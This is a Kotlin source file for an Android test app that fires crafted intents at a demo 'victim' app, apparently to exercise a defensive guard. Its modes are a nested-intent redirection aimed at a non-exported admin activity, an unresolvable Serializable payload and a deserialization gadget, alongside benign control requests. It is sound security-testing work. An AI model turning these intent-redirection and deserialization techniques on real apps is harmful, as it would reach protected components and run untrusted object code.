package com.shezguard.attacker

import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.util.Log
import com.shezguard.router.demo.LegacyProfile
import java.io.Serializable

/**
 * Sends crafted intents that adb cannot express (Intent and Serializable extras) to the demo app,
 * then finishes. Mode from the "attack" extra:
 * - `nested`: threat 1, an Intent for the demo's non-exported InternalAdminActivity inside "next".
 * - `serializable_unknown`: threat 5, a Serializable whose class the demo app does not have.
 * - `gadget`: threat 5b, a LegacyProfile, a class the demo app does have (same name and serialVersionUID).
 *
 * Benign controls (step 12): legitimate requests a partner app would send, which must work. Same transport,
 * so the only difference from the attacks above is the content.
 * - `benign_forward`: "next" is a search link for the demo's own SearchActivity.
 * - `benign_profile`: "profile" is LegacyProfile("alice"). The same class as `gadget`: the legitimate
 *   object runs the same readObject (its "migration"), which is exactly why 5b cannot be told apart.
 *
 * Step 14 will add caller-identity modes (startActivityForResult, FLAG_ACTIVITY_FORWARD_RESULT,
 * ActivityOptions.setShareIdentityEnabled, referrer variants).
 */
class AttackActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val mode = intent.getStringExtra("attack")
        val sent = when (mode) {
            "nested" -> target("ForwardActivity").putExtra(
                "next",
                Intent().setComponent(ComponentName(VICTIM, "$VICTIM.demo.InternalAdminActivity")),
            )
            "serializable_unknown" -> target("ProfileActivity").putExtra("profile", UnknownPayload("x"))
            "gadget" -> target("ProfileActivity").putExtra("profile", LegacyProfile("attacker"))
            "benign_forward" -> target("ForwardActivity").putExtra(
                "next",
                Intent(Intent.ACTION_VIEW, Uri.parse("https://shezguard.example/search?q=mug"))
                    .setComponent(ComponentName(VICTIM, "$VICTIM.demo.SearchActivity")),
            )
            "benign_profile" -> target("ProfileActivity").putExtra("profile", LegacyProfile("alice"))
            else -> null
        }
        if (sent == null) {
            Log.e(TAG, "unknown attack mode: $mode")
        } else {
            Log.i(TAG, "sending mode=$mode to ${sent.component?.flattenToShortString()}")
            startActivity(sent)
        }
        finish()
    }

    private fun target(activity: String) = Intent().setComponent(ComponentName(VICTIM, "$VICTIM.demo.$activity"))

    /** A class that exists only in this app, so the demo app cannot resolve it. */
    class UnknownPayload(val value: String) : Serializable {
        private companion object {
            private const val serialVersionUID: Long = 1L
        }
    }

    companion object {
        const val TAG = "ShezAttacker"
        const val VICTIM = "com.shezguard.router"
    }
}
